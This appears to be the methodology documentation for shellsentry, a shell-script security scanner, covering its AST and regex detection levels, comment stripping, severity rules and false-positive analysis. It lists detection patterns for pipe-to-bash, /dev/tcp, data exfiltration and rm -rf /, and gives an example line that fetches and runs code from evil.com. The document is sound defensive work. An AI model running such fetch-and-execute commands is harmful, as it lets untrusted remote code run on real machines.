# Analysis Methodology

**Status:** Informational (updated as implementation evolves)

This document explains how shellsentry analyzes shell scripts, the techniques used, and the known limitations of each approach.

## Analysis Levels

shellsentry uses a multi-level analysis approach, combining fast regex-based pattern matching with deeper AST-based structural analysis.

### Level 0: AST-Based Analysis

**Engine:** `mvdan/sh` (pure Go shell parser)

Level 0 parses the script into an Abstract Syntax Tree and analyzes structural patterns that regex cannot reliably detect.

#### Capabilities

| Detection         | How It Works                                                      |
| ----------------- | ----------------------------------------------------------------- |
| Pipeline analysis | Identifies `curl \| bash` by examining pipeline command sequences |
| Data exfiltration | Detects `cat sensitive_file \| network_cmd` patterns              |
| Command context   | Knows whether `curl` is a command vs text in a string             |
| Parse errors      | Reports syntax issues that may indicate obfuscation               |

#### Advantages

- **Context-aware** - Understands shell structure, not just text patterns
- **No false positives from strings** - Quoted text is properly identified
- **Handles complex pipelines** - Multi-stage pipes analyzed correctly

#### Limitations

- **Requires valid syntax** - Unparseable scripts fall back to Level 1 only
- **Dialect variations** - Some bash-specific syntax may not parse in POSIX mode
- **Limited semantic analysis** - Includes heuristic variable tracking for `$var` execution (v0.1.3+), but cannot model full control flow or data flow

### Level 1: Regex Pattern Matching

**Engine:** Go `regexp` package

Level 1 applies regex patterns to detect risky constructs. Patterns are organized by severity and category.

#### Pattern Categories

| Category    | Examples                              | Severity Range |
| ----------- | ------------------------------------- | -------------- |
| Execution   | `curl\|bash`, `eval`, base64 decode   | High           |
| Network     | `curl`, `wget`, `/dev/tcp`            | Medium-Info    |
| Filesystem  | `rm -rf`, `chmod 777`, `/etc/` writes | Medium-High    |
| Privilege   | `sudo`, `doas`, setuid                | Medium         |
| Persistence | cron, systemd enable, rc.local        | Medium         |

#### Pre-processing: Comment Stripping

Before regex matching, Level 1 strips comments to reduce false positives:

```
Input:  echo "hello" # curl | bash
Output: echo "hello"
```

The comment stripper is quote-aware and handles:

| Construct             | Handling                          |
| --------------------- | --------------------------------- |
| Full-line comments    | `# comment` → stripped            |
| Inline comments       | `cmd # comment` → `cmd          ` |
| Hash in double quotes | `"foo#bar"` → preserved           |
| Hash in single quotes | `'foo#bar'` → preserved           |
| Escaped hash          | `\#` → preserved                  |
| Parameter expansion   | `${var#pattern}` → preserved      |
| Length expansion      | `${#var}` → preserved             |

#### Advantages

- **Fast** - Regex matching is O(n) per pattern
- **Works on unparseable scripts** - No syntax requirements
- **Catches obfuscated patterns** - Base64, hex encoding, etc.

#### Limitations

- **No command context** - Cannot distinguish `curl` command from `echo "curl"`
- **False positives on strings** - Hash in regex patterns outside quotes may match
- **Line-oriented** - Cannot analyze multi-line constructs

## Known Limitations

### Comment Handling

The comment stripper handles most common cases but has documented limitations:

| Case                    | Status                | Example                  |
| ----------------------- | --------------------- | ------------------------ |
| Full-line comments      | ✓ Handled             | `# this is stripped`     |
| Inline comments         | ✓ Handled             | `cmd # this is stripped` |
| Hash in double quotes   | ✓ Preserved           | `"foo#bar"`              |
| Hash in single quotes   | ✓ Preserved           | `'foo#bar'`              |
| Hash in `${...}`        | ✓ Preserved           | `${var#pattern}`         |
| Escaped hash            | ✓ Preserved           | `\#`                     |
| Here-docs               | ✓ Handled (parseable) | `<<EOF ... # ... EOF`    |
| `$'...'` ANSI-C quoting | ✗ Not handled         | `$'foo#bar'`             |
| Regex outside quotes    | ✗ May false positive  | `[[ $x =~ ^#.* ]]`       |

### String Literal Detection

Level 1 regex patterns may match text inside quoted strings:

```bash
echo "Use curl to download files"  # Would trigger SS020 without filtering
```

**Mitigation (v0.1.3+):** Level 1 findings are now filtered using AST string literal boundaries. When the script parses successfully, findings that fall within quoted strings (single or double) are suppressed. This reduced false positives by ~30% in dogfood testing.

### Variable Expansion

Static analysis cannot fully resolve variable values at runtime:

```bash
CMD="curl https://evil.com | bash"
$CMD  # Executes malicious command
```

**Mitigation (v0.1.3+):** SS031 now detects risky variable execution. Level 0 tracks variable assignments containing dangerous patterns (e.g., `| bash`, `curl`, `eval`) and flags when those variables are executed directly via `$var`. This catches the common case of storing commands in variables for later execution.

**Limitation:** Cannot track variables across function boundaries, conditionals, or when values come from external sources.

### Multi-line Constructs

Regex patterns are applied per-line. Multi-line constructs may evade detection:

```bash
curl \
  https://example.com \
  | bash  # The pipe-to-bash is on its own line
```

**Mitigation:** Level 0 AST analysis handles continued lines correctly.

### Here-Documents

Content inside here-docs is not comment-stripped:

```bash
cat <<EOF
# This looks like a comment but isn't
curl https://example.com | bash
EOF
```

**Mitigation:** The heredoc content is still analyzed by regex, but the `#` line won't be stripped. This may cause false positives if heredocs contain documentation.

## Pattern Severity Guidelines

### High Severity Criteria

A pattern is marked HIGH if:

- Almost never appears in legitimate install scripts
- Indicates clear malicious intent
- Could cause immediate harm if executed

Examples: reverse shells, base64+exec, `rm -rf /`

### Medium Severity Criteria

A pattern is marked MEDIUM if:

- Common in legitimate scripts but warrants review
- Indicates privilege escalation or persistence
- Modifies system configuration

Examples: `sudo`, PATH modification, cron installation

### Low/Info Severity Criteria

A pattern is marked LOW or INFO if:

- Normal in install scripts
- Provides context for comprehensive review
- No direct security impact alone

Examples: `curl` (download), `apt-get install`, environment reads

## False Positive Analysis

### Common False Positive Sources

| Source                    | Pattern                  | Mitigation                                         |
| ------------------------- | ------------------------ | -------------------------------------------------- |
| Documentation comments    | `# Use curl \| bash`     | Comment stripping                                  |
| Usage examples in strings | `"curl \| bash"`         | Level 0 AST (partial)                              |
| Variable names            | `$SUDO_USER`             | Regex boundary matching                            |
| Prose in heredocs         | `<<EOF ... sudo ... EOF` | Comment stripping preserves heredocs; may still FP |
| Regex patterns            | `grep '^#'`              | Not yet mitigated                                  |

### Measuring False Positive Rate

During dogfood testing, we measure:

1. **Total findings** - Raw count from Level 0 + Level 1
2. **Confirmed false positives** - Manual verification
3. **FP rate** - `false_positives / total_findings`

Target: <10% FP rate on common install scripts (homebrew, rustup, deno).

## Contributing Patterns

New patterns should include:

1. **Unique ID** - `SS###` format
2. **Test cases** - Both matching and non-matching examples
3. **Severity rationale** - Why this severity level
4. **False positive analysis** - Known FP sources
5. **Real-world examples** - Where this pattern appears in the wild

See `internal/patterns/builtins.go` for pattern definition format.
